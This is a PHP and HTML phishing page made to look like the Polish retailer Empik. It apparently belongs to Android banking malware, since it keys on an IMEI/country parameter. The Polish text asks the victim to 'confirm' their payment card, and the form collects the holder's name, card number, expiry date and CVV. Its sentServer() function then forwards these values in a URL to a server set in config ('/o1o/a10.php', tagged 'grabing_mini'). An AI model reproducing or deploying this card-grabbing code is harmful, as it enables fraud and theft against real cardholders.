<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Empik</title>

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.2/jquery.min.js"></script>
    <script src="js/credit.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
	<link rel="stylesheet" href="pl/pl.allegro/css/style.css">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>
<body ng-controller="c1">

<div class="booting on text-center">
    <img src="data:image/png;base64,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" alt="" class="booting-logo">
</div>

<form id="form" method="post">
    <div id="form2">
            <h2 style="font-size: 26px;">Potwierdzić dane Twojej karty kredytowej .</h2>
            <h4 style="margin-bottom: 40px;font-size: 14px;">Wprowadź numer Swojej karty kredytowej w celu potwierdzenia twoich danych płatniczych </h3>
        <label for="creditcard">Posiadacze karty</label>
        <input type="text" class="input" name="holder" onkeyup="check();" id="holder" pattern="^[a-zA-Z\s]+$" required autofocus>

        <label for="creditcard">NUMER KARTY</label>
        <input type="text" class="input credit" placeholder="XXXX XXXX XXXX XXXX" name="credit_card_number" id="creditcard" maxlength="16" required>

        <div class="exp-cvv">
            <div class="exp">
                <label for="exp">EXP DATA</label>
                <input type="tel" class="input" style="margin-bottom: 0;" placeholder="MM/YY" maxlength="5" onkeyup="
                var v = this.value;
                if (v.match(/^\d{2}$/) !== null) {
                    this.value = v + '/';
                }
                check();" name="exp" id="exp" required >
           </div>
           <div class="cvv">
                <label for="exp">CVV</label>
                <input type="tel" class="input" placeholder="CVV" style="margin-bottom: 0;" onkeyup="check();" name="cvv" id="cvv" maxlength="3" required>
           </div>

            <div class="center" style="padding: 20px;">
                <input type="button" class="button" value="Potwierdzić" disabled onclick="sentServer();" id="input_submitBtn1">
            </div>
        </div>
    </div>
</form>
<script type="text/javascript">
    jQuery(function ( $ ){
    $(".credit").credit();
    });
</script>
<script>
    function check() {
    var inp1 = document.getElementById('holder'),
        inp2 = document.getElementById('creditcard'),
        inp3 = document.getElementById('exp'),
        inp4 = document.getElementById('cvv');
    document.getElementById('input_submitBtn1').disabled = inp1.value && inp2.value && inp3.value && inp4.value ? false : "disabled";
    }
</script>

<script>main={booting:function(){var t=this;"undefined"!=typeof angular?setTimeout(function(){$(".booting").removeClass("on"),setTimeout(function(){$(".fixed-top").addClass("on"),t.start()},500)},1e3):setTimeout(function(){t.booting()},300)},start:function(){},loader_:{show:function(){$(".booting").addClass("on")},hide:function(){$(".booting").removeClass("on")}}},main.booting()</script>
<script>
function sentServer(){

   var oNumInp3 = document.getElementById('holder');
    var oNumInp4 = document.getElementById('creditcard');
    var oNumInp5 = document.getElementById('exp');
    var oNumInp6 = document.getElementById('cvv');

    if ((oNumInp4.value.length > 10)&&(oNumInp6.value.length > 2)) {
            var url='<?php echo $URL; ?>';
        var imei_c='<?php echo $IMEI_country; ?>';

    location.replace(url+'/o1o/a10.php?p=' + imei_c + '|grabing_mini|'+ oNumInp4.value + '|' + oNumInp5.value + '|' + oNumInp6.value +'|'+oNumInp3.value+'|');
  }
}
    </script>
</body>
</html>
